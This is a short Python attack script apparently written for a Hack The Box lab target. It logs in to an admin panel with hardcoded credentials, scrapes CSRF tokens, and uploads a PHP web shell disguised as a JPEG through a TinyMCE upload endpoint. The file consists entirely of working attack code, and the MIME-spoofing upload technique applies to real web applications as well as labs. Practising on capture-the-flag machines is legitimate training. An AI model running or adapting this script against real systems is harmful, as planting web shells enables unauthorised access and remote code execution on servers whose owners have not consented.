import requests, sys, re

IP = "10.129.12.96"
HOST = "billing.nexus.htb"
BASE = f"http://{IP}"
s = requests.Session()
s.headers.update({"Host": HOST})

r = s.get(f"{BASE}/admin/login", timeout=15)
m = re.search(r'name="_token" value="([^"]+)"', r.text)
token = m.group(1)
print("login token:", token)

r = s.post(f"{BASE}/admin/login", data={
    "_token": token,
    "email": "j.matthew@nexus.htb",
    "password": "N27xh!!2ucY04",
}, timeout=15, allow_redirects=False)
print("login status:", r.status_code, r.headers.get("Location"))

r = s.get(f"{BASE}/admin/mail/inbox", timeout=15)
m = re.search(r'name="_token" value="([^"]+)"', r.text)
token2 = m.group(1)
print("mail token:", token2)

with open("/home/kali/nexus/shell.php", "rb") as f:
    content = f.read()

files = {"file": ("shell.php", content, "image/jpeg")}
data = {"_token": token2}
print("uploading...")
r = s.post(f"{BASE}/admin/tinymce/upload", data=data, files=files, timeout=20)
print("upload status:", r.status_code)
print("upload body:", r.text[:500])
